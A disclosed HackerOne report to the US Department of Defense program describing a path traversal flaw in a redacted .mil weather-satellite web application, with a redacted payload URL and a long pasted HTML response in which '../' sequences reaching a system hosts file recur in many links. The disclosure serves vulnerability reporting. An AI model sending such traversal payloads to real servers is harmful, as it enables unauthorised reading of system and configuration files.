# Path traversal on [███]

## Report Details
- **Report ID**: 1212746
- **URL**: https://hackerone.com/reports/1212746
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-05-29T20:21:21.297Z
- **Disclosed**: 2021-10-13T22:11:46.691Z

## Reporter
- **Username**: ozn3r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Summary:

The web application hosted on the "███████" domain is affected by a path traversal vulnerability that could permit to an attacker to include arbirtary files that are outside of the restricted directory.

Description:

The affected handler is the "█████".

This handler receives, through the "█████" parameter, an input from the user to construct a pathname that is intended to identify a file, but the web app does not properly neutralize "dot-dot-slash (../)" within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory as showed in the following example in which the █████████████/hosts" configuration file is included:

Example of payload:

```
https://█████████████████████████
```

```
<!DOCTYPE html
	PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
	 "http://www.w3.org/TR/html4/loose.dtd">
<html><head><title>███████/████████ █████ Page</title>
<link rev="made" href="mailto:webmaster%40████████████.██████.mil">
<meta name="keywords" content="█████████ ██████████ █████████. ███████">
<meta name="description" content="The U.S ███████'s ███████.  █████.">
<link rel="stylesheet" type="text/css" href="/███████/stylesheets/brainjar_menus_compressed.css"media="all">
<link rel="stylesheet" type="text/css" href="/███/stylesheets/█████compressed.css"media="all">
<link rel="stylesheet" type="text/css" href="/███/stylesheets/█████████animator.css"media="all">
<script src="/████/javascripts/vert_brain_jar_menu.js" type="text/JavaScript"></script>
<script src="/██████/javascripts/jsClockGMT.js" type="text/javascript"></script>
<script src="/██████████/javascripts/popUp2.js" type="text/JavaScript"></script>
<script src="/██████████/javascripts/highlight.js" type="text/JavaScript"></script>
</head>
<body onload="jsClockGMT()" expires="+10m">

<!-- ████ -->
<!-- Start of page title table -->
<TABLE border="0" width="800">
 <TR>
    <th width="150px"><font color="white">.</font></th>
    <th><DIV class="finePrint"><A HREF="/privacy.html" title="Link to DoD Privacy Policy." >Privacy Policy</A></DIV></th>
    <th><DIV class="finePrint"><A HREF="/████████disclaimer.html" title="Link to disclaimer ██████████." >Disclaimer</A></DIV></th>
    <th><font size="-2"><h1>&nbsp;██████ ██████ Page&nbsp;</h1></font></th>
    <th><DIV class="finePrint"><A HREF="/████</A></DIV></th>
 </TR>
</TABLE>
<!-- End of page title table -->
<TR><TD colspan="4"><DIV class="finePrint">&nbsp;NOTE: this page is short lived (10 m).&nbsp;&nbsp;Please <b>DO NOT</b> bookmark it or save it to Favorites;  instead, bookmark <a href="http://███/███████.html" TARGET="_top" title="Link to ████home.html">http://████/████.html</a> thank you.</DIV></TD></TR>

<!-- Start of the table encompassing the whole page -->
<TABLE BORDER=1 width=600>
<TR>
    <TH VALIGN="top" >
    <!-- Start of the ███████ -->
    <CENTER><B>██████████</B></CENTER>

         <DIV class="allOrActives" >
         <TABLE BORDER="0">
         <TR><TH>

        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="████?SIZE=thumb&amp;AGE=Latest&amp;ARCHIVE=all&amp;MO=MAY&amp;YEAR=2021&amp;STYLE=frames" title="Button linking to All"  TARGET = "_top"   >All</a>
        
        </DIV>
        </TH><TH>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton"   style="background: #FFFF00; color: blue;" href="http://███████/██████.html" title="Button linking to Active"  TARGET = "_top"   >Active</a>
        
        </DIV>
        </TH><TH>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="/████████/██████████change_year.cgi?STYLE=tables" title="Button linking to Year"  TARGET = "_top"   >Year</a>
        
        </DIV>
        
        </TH></TR>
        </TABLE>
        </DIV>

        <br><B><a href="████?███████
        
        <table border=0 width="140px"> 
        <DIV class="████">         </DIV> 
        </td></tr>
        </table>

                <br><B><a href="█████████?YEAR=███████
        
        <table border=0 width="140px"> 
        <DIV class="██████████">         </DIV> 
        </td></tr>
        </table>

                <br><B><a href="████████?██████████
        
        <table border=0 width="140px"> 
        <DIV class="███">         </DIV> 
        </td></tr>
        </table>

                <br><B><a href="███?YEAR=██████
        
        <table border=0 width="140px"> 
        <DIV class="███"> <tr><td><A HREF="████████?YEAR=███" >
<IMG SRC = "/████████/icons/ball.green.jpg" BORDER="0" HEIGHT=15 WIDTH=15 ALT="green ball icon"><font size="-1">99W.INVEST</font></A></td><tr><td><A HREF="████████?YEAR=2021&amp;MO=05&amp;BASIN=WPAC&amp;STORM_NAME=90W.INVEST&amp;PROD=track_vis&amp;PHOT=yes&amp;ARCHIVE=active&amp;NAV=████████&amp;AGE=Latest&amp;SIZE=Thumb&amp;STYLE=tables&AID_DIR=/█████/kauai_data/www/pacific/western/██████/microvap/dmsp&TYPE=ssmi" TARGET=_top onMouseover="highlight(this,'yellow')" onMouseout="highlight(this,'')" title="Link to new storm: basin is WPAC storm is 90W.INVEST" >
<IMG SRC = "/████████/icons/ball.green.jpg" BORDER="0" HEIGHT=15 WIDTH=15 ALT="green ball icon"><font size="-1">90W.INVEST</font></A></td>        </DIV> 
        </td></tr>
        </table>

                <br><B><a href="██████?YEAR=███ <br>
        
        <table border=0 width="140px"> 
        <DIV class="███">         </DIV> 
        </td></tr>
        </table>

                <br><B><a href="███?YEAR=██████>
        
        <table border=0 width="140px"> 
        <DIV class="██████"> <tr><td><A HREF="███?YEAR=██████ >
<IMG SRC = "/█████████/icons/ball.green.jpg" BORDER="0" HEIGHT=15 WIDTH=15 ALT="green ball icon"><font size="-1">93S.INVEST</font></A></td>        </DIV> 
        </td></tr>
        </table>

        
    <!-- End of the list_storms cell --> 
    </TH>
    <TH valign="top" WIDTH="89%"  ALIGN="left" >
        <!-- Start of the █████████display cell -->
    
        <Table>
        <!-- Start of the ███████display cell table -->
        <tr><td> 
            <!-- Start of the ████buttons row -->

        <!--<CENTER> -->
        <!-- Start of ██████buttons table top_row -->
        <TABLE border="1">
        <TR><TD>

         <!-- Start of AGE_buttons -->
               <DIV class="button_row">

                <DIV class="button_row_title"> </DIV><table><tr><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton"   style="background: #FFFF00; color: blue;" href="█████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A█████████F_BASIN=wp&A█████F_DIR=/████/kauai_data/www/a█████████f_web/public_html/docs/warnings&A████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&PRODUCT=vapor&SUB_SUB_PROD=1km&USE_THIS_DIR=/█████████/██████████/█████████21/WPAC/90W.INVEST/ssmi/scat&SUB_PROD=modis&SIZE=Thumb&NAV=███&A████████F_YR=2021&YR=21&YEAR=2021&A█████F_FILE=/../../../../../../../../../../../../../../..█████████████████/hosts&███████_FILE=/../../../../../../../../../../../../../../..███████████████████/hosts&DIR=/████████/█████/████████21/WPAC/90W.INVEST/vapor/modis/1km&CURRENT=20210529.033000.aqua.modis.Vapor.███2190WINVEST.covg99p6.unknown.res1km.jpg&██████████=../../../../../../../../../../../../../../..██████████████/hosts&ARCHIVE=active&MO=MAY&PROD=warn&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&TYPE=vapor&STYLE=tables&FORCE_STATIC=1" title="Button linking to Latest"  TARGET = "_top"   >Latest</a>
        
        </DIV>
        </td><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Previous&A████████F_BASIN=wp&A██████████F_DIR=/█████/kauai_data/www/a███f_web/public_html/docs/warnings&A████████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=No&PRODUCT=vapor&SUB_SUB_PROD=1km&USE_THIS_DIR=/█████/████/███21/WPAC/90W.INVEST/ssmi/scat&SUB_PROD=modis&SIZE=Thumb&NAV=██████&A█████F_YR=2021&YR=21&YEAR=2021&A██████████F_FILE=/../../../../../../../../../../../../../../..███████████/hosts&█████_FILE=/../../../../../../../../../../../../../../..████████████████/hosts&DIR=/█████████/███████/█████21/WPAC/90W.INVEST/vapor/modis/1km&█████=../../../../../../../../../../../../../../..█████████████████/hosts&ARCHIVE=active&MO=MAY&PROD=warn&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&TYPE=vapor&STYLE=tables" title="Button linking to Previous"  TARGET = "_top"   >Previous</a>
        
        </DIV>
        </td></tr></table>        </DIV>


        </TD>
        <!-- End of AGE_buttons -->

         <TD>
         <!-- Start of size_buttons -->
      <DIV class="button_row">

                <DIV class="button_row_title"> </DIV><table><tr><td></td><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="██████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A███F_BASIN=wp&A████F_DIR=/█████/kauai_data/www/a████████f_web/public_html/docs/warnings&A█████████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&PRODUCT=vapor&SUB_SUB_PROD=1km&USE_THIS_DIR=/████████/████████/███████21/WPAC/90W.INVEST/ssmi/scat&SUB_PROD=modis&SIZE=Full&NAV=█████&A█████████F_YR=2021&YR=21&YEAR=2021&A████F_FILE=/../../../../../../../../../../../../../../..███████████/hosts&██████_FILE=/../../../../../../../../../../../../../../..██████████████/hosts&DIR=/████████/█████████/█████████21/WPAC/90W.INVEST/vapor/modis/1km&CURRENT=20210529.033000.aqua.modis.Vapor.████2190WINVEST.covg99p6.unknown.res1km.jpg&████████=../../../../../../../../../../../../../../..███████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&TYPE=vapor&STYLE=tables&PROD=warn&FORCE_STATIC=1" title="Button linking to Full"  TARGET = "_top"   >Full</a>
        
        </DIV>
        </td></tr></table>        </DIV>


        <!-- End of size buttons -->
        </TD>
         <TD>
         <!-- Start of display_buttons -->
      <DIV class="button_row"> 

                <DIV class="button_row_title"> </DIV><table><tr><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="██████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A██████F_BASIN=wp&A█████████F_DIR=/█████/kauai_data/www/a█████████f_web/public_html/docs/warnings&A███F_NAME=wp902021&DISPLAY=Pass_Mosaic&PHOT=yes&PRODUCT=vapor&SUB_SUB_PROD=1km&USE_THIS_DIR=/████/█████████/██████████21/WPAC/90W.INVEST/ssmi/scat&SUB_PROD=modis&SIZE=Thumb&NAV=████████&A██████████F_YR=2021&YR=21&YEAR=2021&A██████F_FILE=/../../../../../../../../../../../../../../..███████████████/hosts&████_FILE=/../../../../../../../../../../../../../../..██████████/hosts&DIR=/███/████████/████21/WPAC/90W.INVEST/vapor/modis/1km&CURRENT=20210529.033000.aqua.modis.Vapor.██████████2190WINVEST.covg99p6.unknown.res1km.jpg&███████=../../../../../../../../../../../../../../..███████████████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&TYPE=ssmi&STYLE=tables&PROD=Pass_Mosaic&ANIM_TYPE=Pass_Mosaic" title="Button linking to Pass_Mosaic"  TARGET = "_top"   >Pass_Mosaic</a>
        
        </DIV>
        </td><td>
        <DIV class="menuBar" style="float:left; COLOR: #999999;">
        <a class="menuButton" style="COLOR: #999999;"  >Mosaic</a>
        
        </DIV>
        </td><td>
        <DIV class="menuBar" style="float:left; COLOR: #999999;">
        <a class="menuButton" style="COLOR: #999999;"  >Animate</a>
        
        </DIV>
        </td></tr></table>        </DIV>


        <!-- End of display_buttons -->
        </TD>
        <TD>
        <!-- Start of a███f_buttons-->     
                <DIV class="button_row">

        <DIV class="button_row_title"></DIV><table><tr><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton"   style="background: #FFFF00; color: blue;" href="█████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A████F_BASIN=wp&A████F_DIR=/██████████/kauai_data/www/a██████████f_web/public_html/docs/warnings&A█████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&SUB_SUB_PROD=1km&USE_THIS_DIR=/████/████████/███████21/WPAC/90W.INVEST/ssmi/scat&SUB_PROD=modis&SIZE=Thumb&NAV=████████&A█████████F_YR=2021&YR=21&YEAR=2021&A█████████F_FILE=/█████/kauai_data/www/a██████f_web/public_html/docs/██████████fas/../../../../../../../../../../../../../../..███████████/hosts&██████_FILE=/../../../../../../../../../../../../../../..█████████/hosts&DIR=/███/███████/█████████21/WPAC/90W.INVEST/vapor/modis/1km&CURRENT=20210529.033000.aqua.modis.Vapor.█████████2190WINVEST.covg99p6.unknown.res1km.jpg&███████=../../../../../../../../../../../../../../..██████████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&TYPE=vapor&STYLE=tables&PROD=warn&PRODUCT=vapor" title="Button linking to Text"  TARGET = "_top"   >Text</a>
        
        </DIV>
        </td><td></td><td>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="/a█████f_web/index1.html" title="Button linking to A███F"  TARGET = "_top"   >A████F</a>
        
        </DIV>
        </td></tr></table>      </DIV>

        <!-- End of a█████████f_buttons -->
        </TD>
        <TD>
        <!-- Start of track_vis  button -->

     
            <!-- Start of track+Vis Buttons -->
      <DIV class="button_row">

    
        <DIV class="menuBar" style="float:left; COLOR: #999999;">
        <a class="menuButton" style="COLOR: #999999;"  >TrackImage</a>
        
        </DIV>
           
    </DIV>

        <!-- End of track_vis button -->
        </TD>
        <TD>
        <!-- Start of scatt_amsub buttons -->
      

    <!-- Start of WindVectors Buttons -->
      <DIV class="button_row">
    
    <DIV class="menuBar" style="float:left;"> 
        <a class="menubutton"  onmouseover="buttonMouseover(event, 'WindVectors','horiz');" >WindVectors</a>
           <div class="menuItemSep"></div> 
    </DIV>
        
            <!--WindVectors sub-menus-->
            <DIV id="WindVectors" class="menu"  onmouseover="menuMouseover(event)">
            
            </DIV>
            <!-- End of WindVectors sub-menus-->
          <DIV class="button_row">
    
        </DIV>
        <!-- End of WindVectors Buttons -->


       <!-- End of scatt_amsub buttons -->
       </TD>
    
        <!-- End of scatt_amsub button -->
        </td>
        <td>
        <!-- Start of winds buttons -->
      
    <!-- Start of Winds Buttons -->
      <DIV class="button_row">
    
    <DIV class="menuBar" style="float:left;"> 
        <a class="menubutton"  onmouseover="buttonMouseover(event, 'Winds','horiz');" >Winds</a>
           <div class="menuItemSep"></div> 
    </DIV>
        
            <!--Winds sub-menus-->
            <DIV id="Winds" class="menu"  onmouseover="menuMouseover(event)">
            
            </DIV>
            <!-- End of Winds sub-menus-->
    
        </DIV>
        <!-- End of Winds Buttons -->
    

       <!-- End of winds buttons -->
       </td>
    
       <TD>
       <!-- Start of cloudsat_buttons -->
       
       <!-- Start of cloudSat Buttons -->
       <DIV class="button_row">

       </DIV>
       <!-- End of cloudSat Buttons -->

        <!-- End of cloudsat_buttons -->
        </TD>


        <!-- End of ███████buttons table top_row-->
        </TR> 
        </TABLE>

<TABLE BORDER=3>
<TR><TH>Environment</TH><TD VALIGN="middle" width="400">
 <DIV class="button_row"> 

                <DIV class="button_row_title"> </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="██████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A████F_BASIN=wp&A█████████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&SUB_SUB_PROD=1km&SUB_PROD=modis&SIZE=Thumb&NAV=███████&A████F_YR=2021&YR=21&YEAR=2021&A██████F_FILE=/../../../../../../../../../../../../../../..████████████/hosts&██████_FILE=/../../../../../../../../../../../../../../..█████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.███████2190WINVEST.covg99p6.unknown.res1km.jpg&██████=../../../../../../../../../../../../../../..███████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&STYLE=tables&PRODUCT=vapor&USE_THIS_DIR=/██████████/████/█████████21/WPAC/90W.INVEST/CloudSat&DIR=/████████/███/███21/WPAC/90W.INVEST/vapor/modis/1km&PROD=microvap&TYPE=vapor&AID_DIR=/█████████/██████/███21/WPAC/90W.INVEST/tpw/microvap" title="Button linking to Total Precipital Water"  TARGET = "_top"   >TPW</a>
        
        </DIV>
         

                <DIV class="button_row_title"> </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="█████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A█████F_BASIN=wp&A████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&SUB_SUB_PROD=1km&SUB_PROD=modis&SIZE=Thumb&NAV=█████&A███F_YR=2021&YR=21&YEAR=2021&A█████████F_FILE=/../../../../../../../../../../../../../../..█████████████████/hosts&████_FILE=/../../../../../../../../../../../../../../..█████████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.████2190WINVEST.covg99p6.unknown.res1km.jpg&███=../../../../../../../../../../../../../../..███████████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&STYLE=tables&PRODUCT=vapor&USE_THIS_DIR=/████/██████/████████21/WPAC/90W.INVEST/CloudSat&DIR=/██████/███/██████21/WPAC/90W.INVEST/vapor/modis/1km&PROD=microvap_modvap&TYPE=vapor&AID_DIR=/█████/████████/█████████21/WPAC/90W.INVEST/tpw/microvap_modvap" title="Button linking to Total Precipital Water and NAVGEM TPW"  TARGET = "_top"   >TPW+NAVGEM_TPW</a>
        
        </DIV>
         

                <DIV class="button_row_title"> </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="███████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A███████F_BASIN=wp&A██████████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&SUB_SUB_PROD=1km&SUB_PROD=modis&SIZE=Thumb&NAV=█████████&A███F_YR=2021&YR=21&YEAR=2021&A████F_FILE=/../../../../../../../../../../../../../../..███████████/hosts&███_FILE=/../../../../../../../../../../../../../../..█████████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.██████2190WINVEST.covg99p6.unknown.res1km.jpg&███=../../../../../../../../../../../../../../..███████████████████/hosts&ARCHIVE=active&MO=MAY&BASIN=WPAC&AREA=pacific/southern_hemisphere&STORM_NAME=90W.INVEST&STYLE=tables&PRODUCT=vapor&USE_THIS_DIR=/██████████/██████/█████21/WPAC/90W.INVEST/CloudSat&DIR=/███/█████/█████████21/WPAC/90W.INVEST/vapor/modis/1km&PROD=microvap_modwind&TYPE=vapor&AID_DIR=/███/█████████/████21/WPAC/90W.INVEST/tpw/microvap_modwind" title="Button linking to Total Precipital Water and NAVGEM 850mb winds"  TARGET = "_top"   >TPW+NAVGEM_850_Winds</a>
        
        </DIV>
        
    </DIV>
</TD><TD>      <DIV class="button_row">

                <DIV class="button_row_title"> </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="███?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A████F_BASIN=wp&A██████████F_NAME=wp902021&DISPLAY=Mosaic&PHOT=yes&SUB_SUB_PROD=1km&SUB_PROD=modis&SIZE=Thumb&NAV=██████████&A██████F_YR=2021&A███████F_FILE=/../../../../../../../../../../../../../../..████████████/hosts&████████_FILE=/../../../../../../../../../../../../../../..████████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.█████████2190WINVEST.covg99p6.unknown.res1km.jpg&██████=../../../../../../../../../../../../../../..███████████████/hosts&MO=MAY&BASIN=WPAC&STYLE=tables&PRODUCT=vapor&TYPE=vapor&YEAR=2021&YR=21&STORM_NAME=90W.INVEST&ARCHIVE=active&PROD=shear&DIR=/██████/█████████/████21/WPAC/90W.INVEST/vapor/modis/1km&AREA=pacific/southern_hemisphere&AID_DIR=/███████/███████/████████21/WPAC/90W.INVEST/shear" title="Button linking to Wind_Shear"  TARGET = "_top"   >Wind_Shear</a>
        
        </DIV>
                </DIV>
</TD><TD>      <DIV class="button_row">
    
        <DIV class="button_row_title"> </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton"   style="background: #FF34B3; color: blue;" href="http://█████████/coamps-web/web/███" title="Button linking to COAMPS_██████"  TARGET = "_top"   >COAMPS_██████████</a>
        
        </DIV>
                </DIV>
        </TD>
</TR>
</TABLE>
<TABLE>
<TR><TD>
</TD><TD>
<!-- Start of sector_buttons -->
<DIV class="sectorButtons">
<TABLE BORDER=3 CELLPADDING=2>
     <TR>
<TH>Sensor</TH><TH>% Cov</TH><TH>VIS</TH><TH>IR</TH><TH>IR-BD</TH><TH>Multi<br>Sens.</TH><TH>85GHz<br>H</TH><TH>85GHz<br>weak</TH><TH>85GHz<br>PCT</TH><TH>Color</TH><TH>Rain</TH><TH>Wind</TH><TH>37GHz<br>Color</TH><TH>37GHz<br>V</TH><TH>37GHz<br>H</TH><TH>SSM/I<br>Vapor</TH>
      </TR>

        <!--Start of sector_buttons ssmi -->
        <tr>
    
        <TH>SSMI</TH><TH bgcolor="██████"> <FONT COLOR="#FF0000"><font size="+1"><b></b></font></FONT></TH> 
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
    <!-- End of sector_buttons ssmi -->
    </tr>
    
        <!--Start of sector_buttons ████████ssmis -->
        <tr>
    
        <TH>SSMIS</TH><TH bgcolor="██████████"> <FONT COLOR="#FF0000"><font size="+1"><b></b></font></FONT></TH> 
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
    <!-- End of sector_buttons ████ssmis -->
    </tr>
    
        <!--Start of sector_buttons gmi -->
        <tr>
    
        <TH>GMI</TH><TH bgcolor="████████"> <FONT COLOR="#FF0000"><font size="+1"><b></b></font></FONT></TH> 
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
    <!-- End of sector_buttons gmi -->
    </tr>
    
        <!--Start of sector_buttons amsr2 -->
        <tr>
    
        <TH>AMSR2</TH><TH bgcolor="██████████"> <FONT COLOR="#FF0000"><font size="+1"><b></b></font></FONT></TH> 
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
    <!-- End of sector_buttons amsr2 -->
    </tr>
    
        <!--Start of sector_buttons amsub -->
        <tr>
    
        <TH>AMSUB</TH><TH bgcolor="████"> <FONT COLOR="#FF0000"><font size="+1"><b></b></font></FONT></TH> 
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
       <TH class="iconCell" > </TH>
    <!-- End of sector_buttons amsub -->
    </tr>
    
<!-- End of sector_buttons -->
</table>
</div>

</TD><TD>
<!-- Start of sector_buttons -->
<DIV class="sectorButtons">
<TABLE BORDER=3 CELLPADDING=8>
     <TR>
<TH></TH><TH>VIS</TH><TH>IR</TH><TH>Vapor</TH></TR>
     <!--Start of onekm_buttons gac -->
     <TR>

        <TH> GAC: </TH> <TH class="iconCell" > </TH><TH class="iconCell" > </TH><TH class="iconCell" > </TH>
    <!-- End of onekm_buttons gac -->
    </TR>

    <!-- Start of onekm_buttons geo -->
    <TR>

        <TH> GEO: </TH> <TH class="iconCell" > </TH><TH class="iconCell" > </TH><TH class="iconCell" > </TH>
    <!-- End of onekm_buttons geo -->
    </TR>
    <TR>
    <!-- Start of onekm_buttons modis -->

        <TH> MODIS: </TH> <TH class="iconCell" > 
        <a class="menuButton"  onmouseover="buttonMouseover(event, 'modis_7','sector');" ><IMG class="ballIcon" SRC="/icons/square_red_sm.jpg" title="red icon, product greater than 12 hours old." alt="red icon, product greater than 12 hours old." HEIGHT=15 WIDTH=15 BORDER=0></a>
           <div class="menuItemSep"></div> 
            <!--modis_7 sub-menus-->

            <DIV id="modis_7" class="menu"  onmouseover="menuMouseover(event)">
    
         <a class="oldcolormenuItem" href="████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A█████F_BASIN=wp&A█████████F_DIR=/███/kauai_data/www/a██████████f_web/public_html/docs/warnings&A█████████F_NAME=wp902021&PHOT=yes&SIZE=Thumb&NAV=█████&A██████████F_YR=2021&A███F_FILE=/../../../../../../../../../../../../../../..█████████████/hosts&████_FILE=/../../../../../../../../../../../../../../..█████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.████████2190WINVEST.covg99p6.unknown.res1km.jpg&███=../../../../../../../../../../../../../../..███████████/hosts&MO=MAY&BASIN=WPAC&STYLE=tables&YEAR=2021&YR=21&STORM_NAME=90W.INVEST&ARCHIVE=active&AREA=pacific/southern_hemisphere&DISPLAY=Latest&DIR=/███████/██████/█████21/WPAC/90W.INVEST/vis/modis/1km&TYPE=modis&PROD=vis&SUB_PROD=1km" TARGET="_top">1_Km</a>
       
             </DIV>
    </TH><TH class="iconCell" > 
        <a class="menuButton"  onmouseover="buttonMouseover(event, 'modis_8','sector');" ><IMG class="ballIcon" SRC="/icons/square_green_sm.jpg" title="green icon, product less than 6 hours old." alt="green icon, product less than 6 hours old." HEIGHT=15 WIDTH=15 BORDER=0></a>
           <div class="menuItemSep"></div> 
            <!--modis_8 sub-menus-->

            <DIV id="modis_8" class="menu"  onmouseover="menuMouseover(event)">
    
         <a class="youngcolormenuItem" href="████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A██████████F_BASIN=wp&A████████F_DIR=/████/kauai_data/www/a██████f_web/public_html/docs/warnings&A███████F_NAME=wp902021&PHOT=yes&SIZE=Thumb&NAV=███&A██████████F_YR=2021&A██████F_FILE=/../../../../../../../../../../../../../../..██████████████████/hosts&███_FILE=/../../../../../../../../../../../../../../..█████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.████████2190WINVEST.covg99p6.unknown.res1km.jpg&███████=../../../../../../../../../../../../../../..██████████████/hosts&MO=MAY&BASIN=WPAC&STYLE=tables&YEAR=2021&YR=21&STORM_NAME=90W.INVEST&ARCHIVE=active&AREA=pacific/southern_hemisphere&DISPLAY=Latest&DIR=/███████/███/█████21/WPAC/90W.INVEST/ir/modis/1km&PROD=ir&SUB_PROD=1km&TYPE=modis" TARGET="_top">1_Km</a>
       
             </DIV>
    </TH><TH class="iconCell" > 
        <a class="menuButton"  onmouseover="buttonMouseover(event, 'modis_9','sector');" ><IMG class="ballIcon" SRC="/icons/square_green_sm.jpg" title="green icon, product less than 6 hours old." alt="green icon, product less than 6 hours old." HEIGHT=15 WIDTH=15 BORDER=0></a>
           <div class="menuItemSep"></div> 
            <!--modis_9 sub-menus-->

            <DIV id="modis_9" class="menu"  onmouseover="menuMouseover(event)">
    
